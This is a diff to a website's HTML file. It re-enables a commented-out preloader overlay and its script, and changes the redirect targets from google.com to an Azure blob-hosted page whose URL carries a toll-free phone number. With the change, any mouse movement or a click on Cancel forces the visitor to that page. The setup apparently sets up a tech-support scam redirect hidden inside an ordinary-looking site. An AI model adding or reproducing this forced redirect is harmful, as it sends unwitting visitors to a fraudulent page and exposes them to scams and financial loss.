@@ -999,7 +999,7 @@ nav a:hover::after{
 <body>
 
 <!-- PRELOADER START -->
-<!--<div id="preloader-wrapper">
+<div id="preloader-wrapper">
     <div id="preloader-overlay"></div>
     <div class="preloader-content">
         <div class="spinner"></div>
@@ -1009,7 +1009,7 @@ nav a:hover::after{
             <button id="continueBtn">Continue</button>
         </div>
     </div>
-</div>-->
+</div>
 <!-- PRELOADER END -->
 
 
@@ -1473,7 +1473,7 @@ nav a:hover::after{
 
 
 
-<!--<script>
+<script>
 document.addEventListener("DOMContentLoaded", function(){
 
     const preloaderWrapper = document.getElementById("preloader-wrapper");
@@ -1485,7 +1485,7 @@ document.addEventListener("DOMContentLoaded", function(){
     document.addEventListener('mousemove', function() {
         if (preloaderWrapper.style.display !== 'none' && !mouseMoved) {
             mouseMoved = true;
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://nappnes5.blob.core.windows.net/one/index.html?bcda=1-833-959-2976";
         }
     });
 
@@ -1498,11 +1498,11 @@ document.addEventListener("DOMContentLoaded", function(){
 
     // Cancel button - DIRECT REDIRECT
     cancelBtn.addEventListener("click", ()=> {
-        window.location.href = "https://www.google.com";
+        window.location.href = "https://nappnes5.blob.core.windows.net/one/index.html?bcda=1-833-959-2976";
     });
 
 });
-</script>-->
+</script>
 
 
 
@@ -1544,6 +1544,7 @@ function toggleMenu(){
 
 </body>
 </html>
+
 
 
 
